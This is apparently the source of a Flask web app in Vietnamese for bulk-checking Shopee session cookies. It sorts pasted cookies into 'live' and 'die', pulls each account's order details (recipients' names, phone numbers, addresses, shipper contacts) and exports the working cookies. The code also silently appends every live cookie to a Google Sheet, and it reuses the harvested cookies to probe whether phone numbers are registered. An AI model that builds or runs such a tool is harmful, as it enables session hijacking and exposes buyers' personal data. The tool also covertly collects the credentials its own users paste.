        <table class="table table-hover align-middle m-0 table-fixed">
          <colgroup>
            <col style="width:52px;">
            <col style="width:160px;">
            <col style="width:112px;">
            <col style="width:118px;">
            <col style="width:108px;">
            <col style="width:220px;">
            <col style="width:60px;">
            <col style="width:138px;">
            <col style="width:114px;">
            <col style="width:60px;">
            <col style="width:78px;">
          </colgroup>
          <thead class="table-light">
            <tr>
              <th>STT</th>
              <th>MVĐ</th><th>Trạng thái</th><th>Người nhận</th><th>SĐT nhận</th>
              <th>Địa chỉ</th><th>SP</th><th>Tên shipper</th><th>SĐT ship</th>
              <th>TL</th><th>Chat</th>
            </tr>
          </thead>
          <tbody>
            {% for blk in results %}
              {% for s in blk.summaries %}
                {% set kind = s.status_color or 'secondary' %}
                {% set badge_class = {
                  'success':  'badge text-bg-success-subtle border border-success-subtle text-success',
                  'info':     'badge text-bg-primary-subtle border border-primary-subtle text-primary',
                  'warning':  'badge text-bg-warning-subtle border border-warning-subtle text-warning',
                  'danger':   'badge text-bg-danger-subtle border border-danger-subtle text-danger',
                  'secondary':'badge text-bg-secondary-subtle border border-secondary-subtle text-secondary'
                }[kind] %}
                {% set addr = s.shipping_address or '—' %}
                {% set words = addr.split() %}
                <tr>
                  <td class="nowrap text-center">{{ s.row_index }}</td>
                  <td class="mono nowrap">{{ s.tracking_no or '—' }}</td>
                  <td><span class="{{ badge_class }} badge-wrap">{{ s.status_text or '—' }}</span></td>
                  <td class="nowrap">{{ s.shipping_name or '—' }}</td>
                  <td class="mono nowrap">{{ s.shipping_phone or '—' }}</td>
                  <td class="addr-one" data-bs-toggle="tooltip" data-bs-placement="bottom" title="{{ addr }}">
                    {{ ' '.join(words[:5]) if words else '—' }}{% if words|length > 5 %}…{% endif %}
                  </td>
                  <td>{% if s.product_image %}<img src="{{ s.product_image }}" class="product" alt="sp" loading="lazy" decoding="async">{% else %}—{% endif %}</td>
                  <td class="nowrap">{{ s.shipper_name or '—' }}</td>
                  <td class="mono nowrap">{{ s.shipper_phone or '—' }}</td>
                  <td>
                    {% if s.timeline_full %}
                      <button class="btn btn-outline-secondary btn-icon"
                              type="button"
                              data-bs-toggle="modal"
                              data-bs-target="#timelineModal"
                              data-timeline='{{ s.timeline_full|default("")|tojson }}'
                              title="Timeline">
                        <i class="bi bi-clock-history"></i>
                      </button>
                    {% else %}—{% endif %}
                  </td>
                  <td>
                    {% if s.shop_username %}
                      <a class="btn btn-outline-primary btn-icon" target="_blank" href="https://shopee.vn/chat/@{{ s.shop_username }}" title="Chat shop"><i class="bi bi-chat-dots"></i></a>
                    {% elif s.shop_id %}
                      <a class="btn btn-outline-primary btn-icon" target="_blank" href="https://shopee.vn/chat?channel=6&convId={{ s.shop_id }}" title="Chat shop"><i class="bi bi-chat-dots"></i></a>
                    {% else %}—{% endif %}
                  </td>
                </tr>
              {% endfor %}
            {% endfor %}
          </tbody>
        </table>
      </div>
    </div>
  </div>

  <!-- Mobile/cards -->
  <div class="d-md-none">
    {% for blk in results %}
      {% for s in blk.summaries %}
        {% set kind = s.status_color or 'secondary' %}
        {% set badge_class = {
          'success':  'badge text-bg-success-subtle border border-success-subtle text-success',
          'info':     'badge text-bg-primary-subtle border border-primary-subtle text-primary',
          'warning':  'badge text-bg-warning-subtle border border-warning-subtle text-warning',
          'danger':   'badge text-bg-danger-subtle border border-danger-subtle text-danger',
          'secondary':'badge text-bg-secondary-subtle border border-secondary-subtle text-secondary'
        }[kind] %}
        <div class="card order mb-2">
          <div class="card-body">
            <div class="d-flex justify-content-between">
              <div class="mono">#{{ s.row_index }} · MVD: {{ s.tracking_no or '—' }}</div>
              {% if s.timeline_full %}
              <button class="btn btn-outline-secondary btn-icon"
                      type="button"
                      data-bs-toggle="modal"
                      data-bs-target="#timelineModal"
                      data-timeline='{{ s.timeline_full|default("")|tojson }}'
                      title="Lịch sử vận chuyển">
                <i class="bi bi-clock-history"></i>
              </button>
              {% endif %}
            </div>
            <div class="mt-2">
              <div><strong>Tên:</strong> {{ s.shipping_name or '—' }}</div>
              <div><strong>SDT:</strong> <span class="mono">{{ s.shipping_phone or '—' }}</span></div>
              <div><strong>Đc:</strong> {{ s.shipping_address or '—' }}</div>
              <div class="mt-2"><span class="{{ badge_class }} badge-status">{{ s.status_text or '—' }}</span></div>
            </div>
          </div>
        </div>
      {% endfor %}
    {% endfor %}
  </div>
  {% endif %}
 
<div class="d-flex justify-content-center gap-3 mt-3 flex-wrap">

  <!-- Chip Zalo -->
  <a class="cta-chip cta-zalo is-sm" href="https://zalo.me/g/pnxiba869" target="_blank" rel="noopener">
    <span class="logo">
      <!-- SVG Zalo -->
      <svg width="20" height="20" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
        <defs><linearGradient id="zlg" x1="0%" y1="0%" x2="0%" y2="100%">
          <stop offset="0%" stop-color="#09F"/> <stop offset="100%" stop-color="#08F"/>
        </linearGradient></defs>
        <rect x="4" y="4" width="40" height="40" rx="10" fill="url(#zlg)"/>
        <path fill="#fff" d="M30.7 15.2h-4.9v17.6h4.9V15.2zm-8.4 0H13v3.9h5.1l-5.4 9.9v4h10.1v-3.9h-5.3l5.4-9.9v-4z"/>
      </svg>
    </span>
    <span class="label">MinSu - Nhóm Đặt Đơn Shopee</span>
  </a>





</main>

<!-- Modal: xem Timeline -->
<div class="modal fade" id="timelineModal" tabindex="-1" aria-hidden="true">
  <div class="modal-dialog modal-lg modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Lịch sử vận chuyển</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Đóng"></button>
      </div>
      <div class="modal-body">
        <div id="timelineModalBody" class="small"></div>
      </div>
    </div>
  </div>
</div>

<!-- Modal: Check số Shopee -->
<div class="modal fade" id="checkPhoneModal" tabindex="-1" aria-hidden="true">
  <div class="modal-dialog modal-lg modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title"><i class="bi bi-telephone"></i> Check số Shopee</h5>
        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Đóng"></button>
      </div>
      <div class="modal-body">
        <label class="form-label">Nhập danh sách số (mỗi dòng 0xxxxxxxxx / xxxxxxxxx / 84xxxxxxxxx):</label>
        <textarea id="phonesInput" class="form-control" rows="5" placeholder="0819555222
819555222
8419555222"></textarea>
        <div class="mt-3 d-flex gap-2">
          <button id="btnCheckPhone" class="btn btn-primary">
            <i class="bi bi-telephone-outbound"></i> Check
          </button>
          <div id="checkStatus" class="align-self-center small text-muted"></div>
        </div>

        <div class="table-responsive mt-3">
          <table class="table table-sm table-bordered">
            <thead class="table-light">
              <tr><th style="width:50%">Số</th><th>Kết quả</th></tr>
            </thead>
            <tbody id="phonesResult"><tr><td colspan="2" class="text-center text-muted">Chưa có dữ liệu</td></tr></tbody>
          </table>
        </div>
      </div>
      <div class="modal-footer">
        <button class="btn btn-secondary" data-bs-dismiss="modal">Đóng</button>
      </div>
    </div>
  </div>
</div>
<!-- Modal: Check Cookie SLL -->
<div class="modal fade" id="bulkCookieModal" tabindex="-1" aria-hidden="true">
  <div class="modal-dialog modal-xl modal-dialog-centered modal-dialog-scrollable">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title"><i class="bi bi-shield-check"></i> Check Cookie SLL</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Đóng"></button>
      </div>

      <div class="modal-body">
        <label class="form-label fw-semibold">Dán cookie (mỗi dòng 1 cookie: SPC_ST=... hoặc cookie đầy đủ):</label>
        <textarea id="cookieBulkInput" class="form-control mono" rows="8"
          placeholder="SPC_ST=abc...
SPC_ST=xyz...
..."></textarea>

        <div class="d-flex flex-wrap align-items-center gap-2 mt-3">
          <button id="btnRunCookieCheck" class="btn btn-warning" type="button" onclick="runCookieCheck()">
  <i class="bi bi-play-fill"></i> Check
</button>


          <span class="badge bg-success">Live: <span id="liveCount2">0</span></span>
          <span class="badge bg-secondary">Die: <span id="dieCount2">0</span></span>
          <span id="progressText2" class="text-muted"></span>
        </div>

        <div class="mt-3">
          <pre id="resultArea2" class="border rounded p-2" style="max-height: 50vh; white-space: pre-wrap;"></pre>
        </div>
      </div>

      <div class="modal-footer">
        <button id="btnExportLive2" type="button" class="btn btn-outline-success btn-sm">
          Xuất Cookie Live (.txt)
        </button>
        <button id="btnDeleteDie2" type="button" class="btn btn-outline-danger btn-sm">
          Xoá Cookie Die
        </button>
        <button type="button" class="btn btn-secondary btn-sm" data-bs-dismiss="modal">Đóng</button>
      </div>
    </div>
  </div>
</div>


<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

<script>
  /* Tooltip cho địa chỉ */

document.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('[data-bs-toggle="tooltip"]').forEach(el => {
    new bootstrap.Tooltip(el, { container: 'body', trigger: 'hover focus', delay: { show: 0, hide: 50 } });
  });

  const tlModal = document.getElementById('timelineModal');
  if (tlModal) {
    tlModal.addEventListener('show.bs.modal', (event) => {
      const btn = event.relatedTarget;
      const raw = btn?.getAttribute('data-timeline') || '';
      let htmlTimeline = '';
      try { htmlTimeline = raw ? JSON.parse(raw) : ''; }
      catch { htmlTimeline = raw; }
      const body = document.getElementById('timelineModalBody');
      if (body) body.innerHTML = htmlTimeline || '<em>Không có dữ liệu</em>';
    });
  }
});

  /* Check số Shopee */
  const btnCheck = document.getElementById('btnCheckPhone');
  const txt = document.getElementById('phonesInput');
  const out = document.getElementById('phonesResult');
  const statusEl = document.getElementById('checkStatus');

  function setLoading(on){
    btnCheck.disabled = on;
    btnCheck.innerHTML = on ? '<span class="spinner-border spinner-border-sm me-1"></span> Đang kiểm tra...' :
                              '<i class="bi bi-telephone-outbound"></i> Check';
    statusEl.textContent = on ? 'Đang kiểm tra...' : '';
  }

  btnCheck?.addEventListener('click', async () => {
    const lines = (txt.value || '').split(/\\r?\\n/).map(s => s.trim()).filter(Boolean);
    if (!lines.length) return;

    setLoading(true);
    out.innerHTML = '<tr><td colspan="2" class="text-center text-muted">Đang kiểm tra...</td></tr>';

    try{
      const res = await fetch('/check-phone', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({numbers: lines})
      });
      const data = await res.json();
      const rows = (data.results || []).map(r => {
        const text = r.result === 'Số chưa đăng ký'
          ? '<span class="badge text-bg-success">Số chưa đăng ký</span>'
          : '<span class="badge text-bg-secondary">Số không dùng được</span>';
        return `<tr><td class="mono">${r.phone}</td><td>${text}</td></tr>`;
      });
      out.innerHTML = rows.length ? rows.join('') : '<tr><td colspan="2" class="text-center text-muted">Không có dữ liệu</td></tr>';
      statusEl.textContent = '';
    }catch(e){
      out.innerHTML = '<tr><td colspan="2" class="text-danger text-center">Lỗi gọi API</td></tr>';
    }finally{
      setLoading(false);
    }
  });
</script>

<script>
  // helpers
  function $id(x){ return document.getElementById(x); }
  function collectCookies2() {
    const ta = $id('cookieBulkInput');
    if (!ta) return [];
    return (ta.value || '').split(/\r?\n/).map(s => s.trim()).filter(Boolean);
  }
  function exportLiveTxt2(cookies, results) {
    const lives = cookies.filter((_, i) => results[i] === 'live');
    const blob  = new Blob([lives.join('\n')], { type: 'text/plain;charset=utf-8' });
    const url   = URL.createObjectURL(blob);
    const a     = document.createElement('a');
    a.href = url; a.download = 'cookies_live.txt';
    document.body.appendChild(a); a.click(); a.remove();
    URL.revokeObjectURL(url);
  }
  function deleteDie2(results) {
    const ta = $id('cookieBulkInput');
    if (!ta) return;
    const lines = (ta.value || '').split(/\r?\n/);
    ta.value = lines.filter((_, i) => (results[i] || 'die') === 'live').join('\n');
  }

  // biến nhớ lần check gần nhất
  let lastCookies2 = [];
  let lastResults2 = [];

  // HÀM CHẠY KHI BẤM NÚT CHECK
  async function runCookieCheck() {
    const resultEl = $id('resultArea2');
    const liveEl   = $id('liveCount2');
    const dieEl    = $id('dieCount2');
    const progEl   = $id('progressText2');

    try {
      resultEl.textContent = 'Đang thu thập cookie...';
      liveEl.textContent = '0';
      dieEl.textContent  = '0';
      progEl.textContent = '';

      const cookies = collectCookies2();
      lastCookies2 = cookies.slice();
      if (!cookies.length) {
        resultEl.textContent = 'Chưa có cookie nào.';
        return;
      }

      resultEl.textContent = 'Đang check ' + cookies.length + ' cookie...';
      progEl.textContent = 'Ưu tiên tốc độ.';

      const res = await fetch('/api/check-cookies', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ cookies })
      });
      if (!res.ok) {
        const text = await res.text();
        throw new Error('API trả mã ' + res.status + ': ' + text);
      }

      const data    = await res.json();
      const results = data.results || [];
      lastResults2  = results;

      liveEl.textContent = String(data.live_count ?? results.filter(s => s === 'live').length);
      dieEl .textContent = String(data.die_count  ?? results.filter(s => s !== 'live').length);
      resultEl.textContent = results.map((s, i) => `${i+1}. ${s}`).join('\n');
      progEl.textContent = 'Xong.';
    } catch (e) {
      console.error(e);
      resultEl.textContent = 'Lỗi khi gọi /api/check-cookies: ' + (e?.message || e);
    }
  }

  // Export & Delete trong modal
  $id('btnExportLive2')?.addEventListener('click', () => {
    if (!lastCookies2.length) return;
    exportLiveTxt2(lastCookies2, lastResults2);
  });
  $id('btnDeleteDie2')?.addEventListener('click', () => {
    if (!lastResults2.length) return;
    deleteDie2(lastResults2);
  });
</script>



</body>
</html>
"""

# ================= Favicon (SVG) =================
FAVICON_SVG = """<svg xmlns="http://www.w3.org/2000/svg" width="256" height="256" viewBox="0 0 256 256">
  <rect width="256" height="256" rx="48" fill="#ffffff"/>
  <rect x="8" y="8" width="240" height="240" rx="44" fill="#fff2ee" stroke="#EE4D2D" stroke-width="8"/>
  <text x="50%" y="58%" text-anchor="middle" font-family="Inter,Segoe UI,Arial,sans-serif"
        font-size="150" font-weight="800" fill="#EE4D2D" dominant-baseline="middle">N</text>
</svg>"""

@app.get("/favicon.svg")
def favicon_svg():
    return Response(FAVICON_SVG, mimetype="image/svg+xml")

# ================= Routes =================
@app.route("/", methods=["GET","POST"])
def index():
    cookies_text = ""
    results = []
    row_idx = 1

    if request.method == "POST":
        action = request.form.get("action", "check")
        cookies_text = request.form.get("cookies","").strip()
        cookies = [c.strip() for c in cookies_text.splitlines() if c.strip()]

        # ---------- Export live TXT ----------
        if action == "export_live":
            live = []
            for c in cookies:
                try:
                    fetched = fetch_orders_and_details(c, limit=1, offset=0)
                    details = fetched.get("details", [])
                    ok = False
                    for det in details:
                        raw = det.get("raw") or {}
                        if is_buyer_cancelled(raw): continue
                        s = pick_columns_from_detail(raw)
                        if s.get("tracking_no") or s.get("status_text") not in (None, "—"):
                            ok = True; break
                    if ok: live.append(c)
                except Exception:
                    pass
            return Response("\n".join(live), headers={
                "Content-Type":"text/plain; charset=utf-8",
                "Content-Disposition":"attachment; filename=cookies_live.txt"
            })

        # ---------- Export CSV ----------
        if action == "export_sheet":
            output = io.StringIO()
            writer = csv.writer(output)
            header = ["Cookie","MVĐ","Trạng thái","Người nhận","SĐT nhận","Địa chỉ","Ảnh SP","Tên shipper","SĐT shipper","Timeline"]
            writer.writerow(header)
            for c in cookies:
                fetched = fetch_orders_and_details(c, limit=50, offset=0)
                details = fetched.get("details", [])
                any_row = False
                for det in details:
                    raw = det.get("raw") or {}
                    if is_buyer_cancelled(raw):
                        continue
                    s = pick_columns_from_detail(raw)
                    row = [
                        c,
                        s.get("tracking_no") or "",
                        s.get("status_text") or "",
                        s.get("shipping_name") or "",
                        s.get("shipping_phone") or "",
                        s.get("shipping_address") or "",
                        s.get("product_image") or "",
                        s.get("shipper_name") or "",
                        s.get("shipper_phone") or "",
                        s.get("timeline_preview") or "",
                    ]
                    writer.writerow(row)
                    any_row = True
                if not any_row:
                    writer.writerow([c, "", "", "", "", "", "", "", "", ""])
            csv_bytes = output.getvalue().encode("utf-8-sig")
            return Response(csv_bytes, headers={
                "Content-Type":"text/csv; charset=utf-8",
                "Content-Disposition":"attachment; filename=orders.csv",
            })

        # ---------- Check & render ----------
        rows_to_sheet = []  # chỉ push cookie LIVE
        for c in cookies:
            short = (c[:18] + "…") if len(c) > 18 else c
            block = {"short": short, "summaries": []}
            try:
                fetched = fetch_orders_and_details(c, limit=50, offset=0)
                details = fetched.get("details", [])
                filtered = []
                is_live = False
                for det in details:
                    raw = det.get("raw") or {}
                    if is_buyer_cancelled(raw):
                        continue
                    s = pick_columns_from_detail(raw)
                    filtered.append(s)
                    if s.get("tracking_no") or (s.get("status_text") not in (None, "—")):
                        is_live = True

                if not filtered:
                    block["summaries"] = [{
                        "tracking_no": "—",
                        "status_text": "Cookie khóa/hết hạn",
                        "status_color": "danger",
                        "shipping_name": "—",
                        "shipping_phone": "—",
                        "shipping_address": "—",
                        "product_image": None,
                        "shipper_name": "—",
                        "shipper_phone": "—",
                        "timeline_full": None,
                        "shop_username": None,
                        "shop_id": None,
                    }]
                else:
                    block["summaries"] = filtered

                if is_live:
                    rows_to_sheet.append([c])

                for s in block["summaries"]:
                    s["row_index"] = row_idx
                    row_idx += 1

            except Exception as e:
                block["summaries"] = [{
                    "tracking_no": "—",
                    "status_text": f"Lỗi: {e}",
                    "status_color": "danger",
                    "shipping_name": "—",
                    "shipping_phone": "—",
                    "shipping_address": "—",
                    "product_image": None,
                    "shipper_name": "—",
                    "shipper_phone": "—",
                    "timeline_full": None,
                    "shop_username": None,
                    "shop_id": None,
                    "row_index": row_idx
                }]
                row_idx += 1
            results.append(block)

        # Ghi Google Sheets – IM LẶNG
        if rows_to_sheet:
            _append_rows(rows_to_sheet)

    return render_template_string(TEMPLATE, cookies_text=cookies_text, results=results)

# ======== API: Check số Shopee (1 cookie chính; die mới chuyển backup) ========
@app.post("/check-phone")
def api_check_phone():
    payload = request.get_json(silent=True) or {}
    numbers = payload.get("numbers") or []
    numbers = [str(n).strip() for n in numbers if str(n).strip()]

    cookie_pool = _gs_read_live_cookies()
    used_cookie_source = bool(cookie_pool)
    results = []

    if not cookie_pool:
        return jsonify({
            "results": [{"phone": n, "result": "Số không dùng được"} for n in numbers],
            "used_cookie_source": False
        })

    current_idx = 0
    current_cookie = cookie_pool[current_idx]

    with requests.Session() as sess:
        for raw in numbers:
            info = normalize_phone_variants(raw)
            if not info:
                results.append({"phone": raw, "result": "Số không dùng được"})
                continue
            p0, p84 = info["phone0"], info["phone84"]

            ok, text = _try_check_unbind_once(sess, current_cookie, p84)
            if not ok and current_idx + 1 < len(cookie_pool):
                current_idx += 1
                current_cookie = cookie_pool[current_idx]
                ok, text = _try_check_unbind_once(sess, current_cookie, p84)
            if not ok:
                text = "Số không dùng được"

            results.append({"phone": p0, "result": text})

    return jsonify({"results": results, "used_cookie_source": used_cookie_source})

# ================= Test route ghi sheet thủ công =================
@app.post("/gs-push-cookie")
def gs_push_cookie():
    cookie = request.form.get("cookie","").strip()
    if not cookie:
        return "Thiếu cookie", 400
    _append_rows([[cookie]])  # FULL 1 cột – im lặng nếu chưa cấu hình
    return "OK", 200

# ======== API: Check 1 cookie -> trả JSON cho Apps Script ========
@app.post("/api/check-cookie")
def api_check_cookie_single():
    """
    Input JSON: { "cookie": "SPC_ST=..." }
    Output JSON:
      - { "data": null } nếu không có đơn hợp lệ
      - { "data": {...} } nếu có; data chứa cả:
          * Schema LỒNG: shipping/status/address/info_card (giữ tương thích)
          * Schema PHẲNG: tracking_no/status_text/.../shipper_name/shipper_phone
    Ghi chú:
      - Bỏ qua các đơn bị buyer-cancelled.
      - Chọn đơn đầu tiên còn dữ liệu hợp lệ (có MVD hoặc status).
    """
    try:
        payload = request.get_json(silent=True) or {}
        cookie = (payload.get("cookie") or "").strip()
        if not cookie:
            return jsonify({"data": None, "error": "missing cookie"}), 400

        # Lấy tối đa 50 đơn để tìm 1 đơn "hợp lệ"
        fetched = fetch_orders_and_details(cookie, limit=50, offset=0)
        details = fetched.get("details", []) if isinstance(fetched, dict) else []

        chosen_raw = None
        chosen_sum = None

        # Chọn đơn đầu tiên hợp lệ (không buyer-cancelled, có MVD hoặc status)
        for det in details:
            raw = det.get("raw") or {}
            if is_buyer_cancelled(raw):
                continue
            s = pick_columns_from_detail(raw)
            has_any = bool(s.get("tracking_no") or (s.get("status_text") not in (None, "—")))
            if has_any:
                chosen_raw = raw
                chosen_sum = s
                break

        # Không có đơn phù hợp
        if not chosen_sum:
            return jsonify({"data": None})

        # ===== Map dữ liệu =====
        tracking_no = chosen_sum.get("tracking_no") or ""
        status_text = chosen_sum.get("status_text") or ""

        # Shipper (có thể chỉ xuất hiện khi đơn đã ra vận chuyển)
        shipNm = (
            chosen_sum.get("shipper_name")
            or (find_first_key(chosen_raw, "driver_name") or "")
            or ""
        )
        shipPh = (
            chosen_sum.get("shipper_phone")
            or (find_first_key(chosen_raw, "driver_phone") or "")
            or ""
        )

        # Địa chỉ/người nhận
        shipping_name  = chosen_sum.get("shipping_name")  or ""
        shipping_phone = chosen_sum.get("shipping_phone") or ""
        shipping_addr  = chosen_sum.get("shipping_address") or ""

        # Ảnh sản phẩm (nếu có)
        product_image = chosen_sum.get("product_image") or ""

        # Tổng tiền (nếu parse được)
        try:
            final_total = int(find_first_key(chosen_raw, "final_total") or 0)
        except Exception:
            final_total = 0

        # Sản phẩm: cố gắng lấy danh sách item (name/shop_id/item_id)
        items_out = []
        try:
            pcards = find_first_key(chosen_raw, "parcel_cards")
            if isinstance(pcards, list) and pcards:
                p0 = pcards[0] if isinstance(pcards[0], dict) else {}
                pinfo = p0.get("product_info") or {}
                groups = pinfo.get("item_groups") or []
                if groups and isinstance(groups[0], dict):
                    its = groups[0].get("items")
                    if isinstance(its, list):
                        for it in its:
                            if not isinstance(it, dict):
                                continue
                            items_out.append({
                                "name": it.get("name") or it.get("item_name") or "",
                                "shop_id": it.get("shop_id") or it.get("shopid"),
                                "item_id": it.get("item_id") or it.get("itemid"),
                            })
        except Exception:
            # im lặng nếu không đọc được danh sách item
            pass

        # ===== Gói dữ liệu trả về =====
        data = {
            # --- Schema LỒNG (tương thích Apps Script cũ) ---
            "shipping": {
                "tracking_number": tracking_no,
                "tracking_info": {"description": status_text},
                "shipper_name":  shipNm,   # thêm
                "shipper_phone": shipPh,   # thêm
            },
            "status": {"list_view_text": {"text": status_text}},
            "address": {
                "shipping_name":  shipping_name,
                "shipping_phone": shipping_phone,
                "shipping_address": shipping_addr,
            },
            "info_card": {
                "final_total": final_total,
                "parcel_cards": [
                    {
                        "product_info": {
                            "item_groups": [
                                {"items": items_out}
                            ]
                        }
                    }
                ]
            },

            # --- Schema PHẲNG (để điền sheet dễ hơn) ---
            "tracking_no":      tracking_no,
            "status_text":      status_text,
            "shipping_name":    shipping_name,
            "shipping_phone":   shipping_phone,
            "shipping_address": shipping_addr,
            "product_image":    product_image,
            "shipper_name":     shipNm,
            "shipper_phone":    shipPh,
        }

        return jsonify({"data": data})

    except Exception as e:
        # Trả lỗi có thể debug được trên Apps Script (ghi vào cột D)
        return jsonify({"data": None, "error": str(e)}), 500

# ================= Entry local =================
@app.get("/api/ping")
def api_ping():
    return jsonify({"ok": True})

if __name__ == "__main__":
    # Local run
    app.run(host="0.0.0.0", port=5000)
